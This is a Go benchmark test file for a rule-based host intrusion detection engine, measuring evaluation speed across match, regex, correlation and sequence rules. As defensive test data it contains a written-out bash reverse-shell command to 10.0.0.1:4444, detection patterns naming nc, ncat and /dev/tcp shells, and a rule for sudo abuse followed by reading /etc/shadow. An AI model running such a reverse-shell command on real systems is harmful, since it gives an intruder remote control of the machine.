package localrules

import (
	"encoding/json"
	"fmt"
	"testing"
)

// benchStore creates a in-memory store for benchmarks.
func benchStore(b *testing.B, rules []Rule) *Store {
	b.Helper()
	dir := b.TempDir()
	store, err := NewStore(dir, nil)
	if err != nil {
		b.Fatalf("NewStore: %v", err)
	}
	if len(rules) > 0 {
		rs := &RuleSet{Version: 1, Rules: rules}
		store.mu.Lock()
		store.current = rs
		store.version.Store(1)
		store.mu.Unlock()
	}
	return store
}

// BenchmarkEvaluate_SimpleNoMatch is the most common path: event doesn't match any rule.
// This runs on every non-attack event — target: budget of 100µs/event must hold.
func BenchmarkEvaluate_SimpleNoMatch(b *testing.B) {
	rules := []Rule{{
		ID: "B-001", Severity: SeverityCritical,
		Conditions: []Condition{
			{Field: "event_type", Op: "eq", Value: "process_exec", Weight: 1.0},
			{Field: "cmdline", Op: "contains", Value: "/dev/tcp", Weight: 5.0},
		},
		Threshold: 5.0, Response: ResponseLog,
	}}
	store := benchStore(b, rules)
	engine := NewEngine(store, DefaultEngineConfig())
	event := map[string]interface{}{
		"event_type": "file_open",
		"path":       "/etc/passwd",
		"pid":        float64(1234),
	}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = engine.Evaluate(event)
	}
}

// BenchmarkEvaluate_SimpleMatch measures the path where a rule fires and a Detection is returned.
func BenchmarkEvaluate_SimpleMatch(b *testing.B) {
	rules := []Rule{{
		ID: "B-002", Severity: SeverityCritical,
		Conditions: []Condition{
			{Field: "event_type", Op: "eq", Value: "process_exec", Weight: 1.0},
			{Field: "cmdline", Op: "contains", Value: "/dev/tcp", Weight: 5.0},
		},
		Threshold: 5.0, Response: ResponseKillProcess,
	}}
	store := benchStore(b, rules)
	engine := NewEngine(store, DefaultEngineConfig())
	event := map[string]interface{}{
		"event_type": "process_exec",
		"cmdline":    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
		"pid":        float64(1234),
	}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = engine.Evaluate(event)
	}
}

// BenchmarkEvaluate_Regex measures the overhead of regex matching on the hot path.
func BenchmarkEvaluate_Regex(b *testing.B) {
	rules := []Rule{{
		ID: "B-003", Severity: SeverityHigh,
		Conditions: []Condition{
			{Field: "event_type", Op: "eq", Value: "process_exec", Weight: 1.0},
			{Field: "cmdline", Op: "regex", Value: `nc.*-e|ncat.*--exec|bash.*-i.*>&.*\/dev\/tcp`, Weight: 5.0},
		},
		Threshold: 5.0, Response: ResponseKillProcess,
	}}
	store := benchStore(b, rules)
	engine := NewEngine(store, DefaultEngineConfig())
	event := map[string]interface{}{
		"event_type": "process_exec",
		"cmdline":    "ls -la /tmp",
		"pid":        float64(42),
	}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = engine.Evaluate(event)
	}
}

// BenchmarkEvaluate_Numeric measures the new gt/lt/gte/lte operators on the hot path.
func BenchmarkEvaluate_Numeric(b *testing.B) {
	rules := []Rule{{
		ID: "B-004", Severity: SeverityMedium,
		Conditions: []Condition{
			{Field: "event_type", Op: "eq", Value: "net_connect", Weight: 1.0},
			{Field: "dst_port", Op: "lte", Value: 1024.0, Weight: 3.0},
			{Field: "dst_port", Op: "gt", Value: 0.0, Weight: 1.0},
		},
		Threshold: 4.0, Response: ResponseLog,
	}}
	store := benchStore(b, rules)
	engine := NewEngine(store, DefaultEngineConfig())
	event := map[string]interface{}{
		"event_type": "net_connect",
		"dst_port":   float64(443),
		"dst_ip":     "93.184.216.34",
	}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = engine.Evaluate(event)
	}
}

// BenchmarkEvaluate_Correlation measures the counter increment path.
// Every auth_failure event goes through IncrementCounter.
func BenchmarkEvaluate_Correlation(b *testing.B) {
	rules := []Rule{{
		ID: "B-005", Severity: SeverityHigh,
		Correlation: &CorrelationSpec{
			EventType:      "auth_failure",
			GroupBy:        "src_ip",
			CountThreshold: 1000, // high threshold to avoid reset noise
			TimeframeSec:   3600,
		},
		Threshold: 1.0, Response: ResponseBlockIP,
	}}
	store := benchStore(b, rules)
	engine := NewEngine(store, DefaultEngineConfig())
	event := map[string]interface{}{
		"event_type": "auth_failure",
		"src_ip":     "10.0.0.1",
	}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = engine.Evaluate(event)
	}
}

// BenchmarkEvaluate_Correlation_1000Groups measures correlator under many concurrent groups.
// Simulates 1000 distinct source IPs each sending events.
func BenchmarkEvaluate_Correlation_1000Groups(b *testing.B) {
	rules := []Rule{{
		ID: "B-006", Severity: SeverityHigh,
		Correlation: &CorrelationSpec{
			EventType:      "auth_failure",
			GroupBy:        "src_ip",
			CountThreshold: 1000000,
			TimeframeSec:   3600,
		},
		Threshold: 1.0, Response: ResponseBlockIP,
	}}
	store := benchStore(b, rules)
	cfg := DefaultEngineConfig()
	cfg.MaxCorrelationGroups = 2000
	engine := NewEngine(store, cfg)

	events := make([]map[string]interface{}, 1000)
	for i := range events {
		events[i] = map[string]interface{}{
			"event_type": "auth_failure",
			"src_ip":     fmt.Sprintf("10.0.%d.%d", i/256, i%256),
		}
	}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = engine.Evaluate(events[i%1000])
	}
}

// BenchmarkEvaluate_Sequence measures the sequence step-advance path.
func BenchmarkEvaluate_Sequence(b *testing.B) {
	rules := []Rule{{
		ID: "B-007", Severity: SeverityCritical,
		Sequence: &SequenceSpec{
			TimeframeSec: 300,
			Steps: []SequenceStep{
				{EventType: "auth_failure", FieldMatch: map[string]interface{}{"service": "sudo"}},
				{EventType: "process_exec", FieldMatch: map[string]interface{}{"binary": "/usr/bin/sudo"}},
				{EventType: "file_access", FieldMatch: map[string]interface{}{"path": "/etc/shadow"}},
			},
			GroupBy: "uid",
		},
		Threshold: 1.0, Response: ResponseKillProcess,
	}}
	store := benchStore(b, rules)
	engine := NewEngine(store, DefaultEngineConfig())
	// Step 1 event — never completes the sequence in bench loop
	event := map[string]interface{}{
		"event_type": "auth_failure",
		"service":    "sudo",
		"uid":        "1000",
	}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = engine.Evaluate(event)
	}
}

// BenchmarkEvaluate_50Rules_NoMatch measures the full budget with the maximum rule set.
// Represents worst-case per-event cost: all 50 rules evaluated, none fire.
func BenchmarkEvaluate_50Rules_NoMatch(b *testing.B) {
	rules := make([]Rule, 50)
	for i := range rules {
		sev := SeverityLow
		switch i % 4 {
		case 0:
			sev = SeverityCritical
		case 1:
			sev = SeverityHigh
		case 2:
			sev = SeverityMedium
		}
		rules[i] = Rule{
			ID:       fmt.Sprintf("B-BULK-%02d", i),
			Severity: sev,
			Conditions: []Condition{
				{Field: "event_type", Op: "eq", Value: "process_exec", Weight: 1.0},
				{Field: "cmdline", Op: "contains", Value: fmt.Sprintf("marker_%d", i), Weight: 5.0},
			},
			Threshold: 5.0, Response: ResponseLog,
		}
	}
	store := benchStore(b, rules)
	cfg := DefaultEngineConfig()
	cfg.MaxRules = 50
	engine := NewEngine(store, cfg)
	event := map[string]interface{}{
		"event_type": "file_open",
		"path":       "/etc/passwd",
	}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = engine.Evaluate(event)
	}
}

// BenchmarkEvaluate_Parallel measures throughput under concurrent goroutines.
// The engine uses RWMutex — reads should scale linearly with cores.
func BenchmarkEvaluate_Parallel(b *testing.B) {
	rules := []Rule{{
		ID: "B-PAR", Severity: SeverityCritical,
		Conditions: []Condition{
			{Field: "event_type", Op: "eq", Value: "process_exec", Weight: 1.0},
			{Field: "cmdline", Op: "contains", Value: "/dev/tcp", Weight: 5.0},
		},
		Threshold: 5.0, Response: ResponseLog,
	}}
	store := benchStore(b, rules)
	engine := NewEngine(store, DefaultEngineConfig())
	b.ResetTimer()
	b.RunParallel(func(pb *testing.PB) {
		event := map[string]interface{}{
			"event_type": "file_open",
			"path":       "/var/log/syslog",
		}
		for pb.Next() {
			_ = engine.Evaluate(event)
		}
	})
}

// BenchmarkParseNumericPair measures the cost of numeric field comparison.
var sinkBool bool

func BenchmarkParseNumericPair_Float64(b *testing.B) {
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		fv, tv, ok := parseNumericPair("85", float64(80))
		sinkBool = ok && fv > tv
	}
}

func BenchmarkParseNumericPair_String(b *testing.B) {
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		fv, tv, ok := parseNumericPair("85", "80")
		sinkBool = ok && fv > tv
	}
}

func BenchmarkParseNumericPair_JSONNumber(b *testing.B) {
	val := json.Number("80")
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		fv, tv, ok := parseNumericPair("85", val)
		sinkBool = ok && fv > tv
	}
}
